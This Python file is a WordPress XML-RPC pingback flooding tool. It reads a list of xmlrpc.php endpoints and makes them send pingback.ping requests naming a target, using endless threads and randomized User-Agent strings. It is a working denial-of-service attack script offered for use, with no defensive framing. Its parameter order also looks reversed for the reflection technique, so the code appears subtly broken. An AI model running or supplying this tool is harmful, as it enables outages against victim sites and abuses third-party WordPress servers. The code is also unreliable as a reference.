import requests
import threading
from utils.randomizer import Randomizer

class WordPressPingback:
    def __init__(self, target, xmlrpc_list_file="payloads/wp_xmlrpc.txt"):
        self.target = target
        self.xmlrpc_urls = []
        self.ua = Randomizer()
        self._load_xmlrpc(xmlrpc_list_file)

    def _load_xmlrpc(self, filepath):
        try:
            with open(filepath, 'r') as f:
                self.xmlrpc_urls = [line.strip() for line in f if line.strip()]
        except:
            self.xmlrpc_urls = ["http://example.com/xmlrpc.php"]

    def _send_pingback(self, src_site):
        payload = f"""<methodCall><methodName>pingback.ping</methodName><params><param><value><string>{src_site}</string></value></param><param><value><string>{self.target}</string></value></param></params></methodCall>"""
        headers = {'User-Agent': self.ua.get_random_ua()}
        try:
            requests.post(src_site, data=payload, headers=headers, timeout=5)
        except:
            pass

    def start(self, threads=10):
        def worker():
            while True:
                src = self.ua.random_choice(self.xmlrpc_urls)
                self._send_pingback(src)
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()